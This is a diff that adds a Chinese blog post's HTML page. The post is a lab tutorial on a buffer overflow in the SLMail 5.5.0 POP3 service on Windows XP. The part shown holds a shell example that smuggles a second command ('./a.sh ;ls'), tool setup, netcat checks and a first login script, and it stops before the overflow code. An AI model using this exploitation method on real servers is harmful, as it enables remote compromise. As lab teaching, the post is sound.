@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓冲区溢出之WINDOWS实例">
+<meta property="og:url" content="https://z9m8r8.github.io/2022/01/28/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BWINDOWS%E5%AE%9E%E4%BE%8B/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-28T06:26:00.000Z">
+<meta property="article:modified_time" content="2023-12-23T13:42:15.606Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="缓冲区溢出">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2022/01/28/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BWINDOWS%E5%AE%9E%E4%BE%8B/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2022/01/28/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BWINDOWS%E5%AE%9E%E4%BE%8B/","path":"2022/01/28/缓冲区溢出之WINDOWS实例/","title":"缓冲区溢出之WINDOWS实例"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>缓冲区溢出之WINDOWS实例 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="nav-text">1. 程序漏洞从哪里来</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-text">2. 缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-text">3. WINDOWS 缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="nav-text">1、实验环境及工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#slmail-5.5.0-mail-server-%E5%AE%89%E8%A3%85"><span class="nav-text">2、SLMail 5.5.0 Mail
+Server 安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#immunitydebugger_1_85_setup.exe%E7%9A%84%E5%AE%89%E8%A3%85"><span class="nav-text">3、ImmunityDebugger_1_85_setup.exe的安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mona.py%E5%AE%89%E8%A3%85"><span class="nav-text">4、 mona.py安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95"><span class="nav-text">5、环境测试：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#slmail-5.5.0-mail-server"><span class="nav-text">6、SLMail 5.5.0 Mail
+Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fuzzing"><span class="nav-text">7、FUZZING</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pop3"><span class="nav-text">7.0 POP3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95-pass-%E5%91%BD%E4%BB%A4%E6%8E%A5%E6%94%B6%E5%88%B0%E5%A4%A7%E9%87%8F%E6%95%B0%E6%8D%AE%E6%97%B6%E6%98%AF%E5%90%A6%E4%BC%9A%E6%BA%A2%E5%87%BA"><span class="nav-text">7.1 测试 PASS
+命令接收到大量数据时是否会溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%AF%BB%E6%89%BE%E8%A6%86%E7%9B%96eip%E5%9C%B0%E5%9D%80%E7%9A%844-%E4%B8%AA%E5%AD%97%E8%8A%82"><span class="nav-text">7.2 确定（寻找）覆盖EIP地址的4
+个字节</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-text">7.3 攻击思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%9D%8F%E5%AD%97%E7%AC%A6"><span class="nav-text">7.4 确定坏字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="nav-text">7.5 重定向数据流</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90shellcode"><span class="nav-text">7.6 生成shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-text">7.7 getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E6%8E%A7%E5%88%B6"><span class="nav-text">7.8 图形界面控制</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2022/01/28/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BWINDOWS%E5%AE%9E%E4%BE%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="缓冲区溢出之WINDOWS实例 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          缓冲区溢出之WINDOWS实例
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-01-28 14:26:00" itemprop="dateCreated datePublished" datetime="2022-01-28T14:26:00+08:00">2022-01-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-12-23 21:42:15" itemprop="dateModified" datetime="2023-12-23T21:42:15+08:00">2023-12-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">Kail Linux渗透测试</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" itemprop="url" rel="index"><span itemprop="name">缓冲区溢出</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>17 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="程序漏洞从哪里来">1. 程序漏洞从哪里来</h2>
+<p><strong>• 罪恶的根源：变量</strong></p>
+<p><strong>• 数据与代码边界不清</strong></p>
+<p><strong>• 根源在于对输入的数据未做检查或检查机制不完善！</strong></p>
+<p><strong>• 最简漏洞原理---- shell脚本漏洞</strong></p>
+<p><strong>示例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># cat a.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash　　　　　　#指定解释器  </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$1</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh 1</span></span><br><span class="line">1</span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh Hello world!</span></span><br><span class="line">Hello</span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh &quot;Hello world!&quot;</span></span><br><span class="line">Hello world!</span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh ;ls　　　　#对输入的参数未做检查直接执行了 2.jpg  a.sh exploits  wireshark.pcapng</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh ;pwd　　　　#同上</span></span><br><span class="line"></span><br><span class="line">/root/Desktop/tests</span><br></pre></td></tr></table></figure>
+<h2 id="缓冲区溢出">2. 缓冲区溢出</h2>
+<p>•
+当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被"撑暴"，从而覆盖了相邻内存区域的数据；</p>
+<p>•
+成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</p>
+<p>• <strong>缓冲区溢出原理：</strong><a
+target="_blank" rel="noopener" href="http://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html"
+class="uri">http://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html</a></p>
+<p><strong>如何发现漏洞？</strong></p>
+<p><strong>• 源码审计</strong></p>
+<p><strong>• 逆向工程</strong></p>
+<p><strong>• 模糊测试</strong></p>
+<p><strong>• 向程序堆栈半随机的数据，根据内存变化判断溢出</strong></p>
+<p><strong>• 数据生成器：生成随机、半随机数据</strong></p>
+<p><strong>• 测试工具：识别溢出漏洞</strong></p>
+<h2 id="windows-缓冲区溢出">3. WINDOWS 缓冲区溢出</h2>
+<h3 id="实验环境及工具">1、实验环境及工具</h3>
+<p><strong>• kali 2019.3</strong></p>
+<p><strong>• Windows_xp_sp3</strong></p>
+<p><strong>• SLMail 5.5.0 Mail Server</strong></p>
+<p>• 下载：<a target="_blank" rel="noopener" href="https://slmail.software.informer.com/download/"
+class="uri">https://slmail.software.informer.com/download/</a></p>
+<p><strong>• ImmunityDebugger_1_85_setup.exe</strong></p>
+<p>•
+下载：&lt;https://www.softpedia.com/get/Programming/Debuggers-Decompilers-
+Dissasemblers/Immunity-Debugger.shtml&gt;</p>
+<p>• 动态调试工具，可调用python脚本,使用python2.7环境</p>
+<p><strong>• mona.py</strong></p>
+<p>• 下载：<a target="_blank" rel="noopener" href="https://github.com/corelan/mona"
+class="uri">https://github.com/corelan/mona</a></p>
+<p>• 手册：<a
+target="_blank" rel="noopener" href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/"
+class="uri">https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/</a></p>
+<p><strong>• RegSnap</strong></p>
+<p>• 下载：<a target="_blank" rel="noopener" href="https://www.onlinedown.net/soft/38491.htm"
+class="uri">https://www.onlinedown.net/soft/38491.htm</a></p>
+<h3 id="slmail-5.5.0-mail-server-安装"><strong>2、SLMail 5.5.0 Mail
+Server 安装</strong></h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173454005-965500081.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173504272-1091448359.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173513873-405319817.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173524721-294796552.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173538936-348244788.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173550236-414274462.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173600079-137155035.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173626033-936282232.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127200732802-1358583795.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173817893-569737845.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127183710735-1705811640.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127182047410-69357115.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173929942-44265857.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173941403-924529866.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127183845721-526593658.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127183919695-1140411592.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127183948043-2043212847.png" /></p>
+<p><strong>检查安装结果：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127200936047-72348839.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127174013031-1434788656.png" /></p>
+<h3
+id="immunitydebugger_1_85_setup.exe的安装"><strong>3、ImmunityDebugger_1_85_setup.exe的安装</strong></h3>
+<p><strong>略</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127202653197-618726388.png" /></strong></p>
+<h3 id="mona.py安装"><strong>4、 mona.py安装</strong></h3>
+<p><strong>mona.py直接放在
+ImmunityDebugger_1_85_setup.exe安装路径下的PyCommands路径下（如下图）</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127174146930-2118627038.png" /></strong></p>
+<h3 id="环境测试"><strong>5、环境测试：</strong></h3>
+<p><strong>注意：将winxp_sp3防火墙关闭或开放26（smtp一般默认为25），110（pop3）等端口方可实验！</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># nc 10.10.10.131 26</span></span><br><span class="line">220 test.com SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here</span><br><span class="line">hello</span><br><span class="line">500 Syntax error, <span class="built_in">command</span> unrecognized</span><br><span class="line">ok</span><br><span class="line">500 Syntax error, <span class="built_in">command</span> unrecognized</span><br><span class="line">quit</span><br><span class="line">221 test.com Service closing transmission channel</span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># nc 10.10.10.131 110</span></span><br><span class="line">+OK POP3 server test.com ready &lt;00003.1081687@test.com&gt;</span><br><span class="line">USER z9m8r8</span><br><span class="line">+OK z9m8r8 welcome here</span><br><span class="line">PASS <span class="built_in">test</span></span><br><span class="line">-ERR invalid password</span><br><span class="line">quit</span><br><span class="line">+OK POP3 server test.com signing off.</span><br></pre></td></tr></table></figure>
+<h3 id="slmail-5.5.0-mail-server"><strong>6、SLMail 5.5.0 Mail
+Server</strong></h3>
+<p>• ports：25 110 139 8376</p>
+<p>• POP3 PASS 命令存在缓冲区溢出漏洞</p>
+<p>• 无需身份验证实现远程代码执行</p>
+<p>• DEP：阻止代码从数据页被执行</p>
+<p>• ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化</p>
+<h3 id="fuzzing">7、FUZZING</h3>
+<h4 id="pop3">7.0 POP3</h4>
+<p>• Nc 110端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># nc 10.10.10.131 110</span></span><br><span class="line">+OK POP3 server test.com ready &lt;00003.1081687@test.com&gt;</span><br><span class="line">USER z9m8r8</span><br><span class="line">+OK z9m8r8 welcome here</span><br><span class="line">PASS <span class="built_in">test</span></span><br><span class="line">-ERR invalid password</span><br><span class="line">quit</span><br><span class="line">+OK POP3 server test.com signing off.</span><br></pre></td></tr></table></figure>
+<p>• 如何了解应用/协议能接受的固定指令</p>
+<p>• Wireshark</p>
+<p>• RFC</p>
+<p><strong>01.py：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)               <span class="comment">###将110端口返回的数据显示在屏幕中</span></span><br><span class="line">   <span class="built_in">print</span> data</span><br><span class="line"> </span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   <span class="built_in">print</span> data</span><br><span class="line"> </span><br><span class="line">   s.send(<span class="string">&quot;PASS test\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   <span class="built_in">print</span> data</span><br><span class="line"> </span><br><span class="line">   s.close()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>测试：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./01.py </span></span><br><span class="line"></span><br><span class="line">Sending evil buffer...</span><br><span class="line">+OK POP3 server test.com ready &lt;00002.960781@test.com&gt;</span><br><span class="line"></span><br><span class="line">+OK z9m8r8 welcome here</span><br><span class="line"></span><br><span class="line">-ERR invalid password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Done</span><br></pre></td></tr></table></figure>
+<h4 id="测试-pass-命令接收到大量数据时是否会溢出">7.1 测试 PASS
+命令接收到大量数据时是否会溢出</h4>
+<p><strong>• EIP 寄存器存放下一条指令的地址</strong></p>
+<p><strong>02.py：</strong></p>
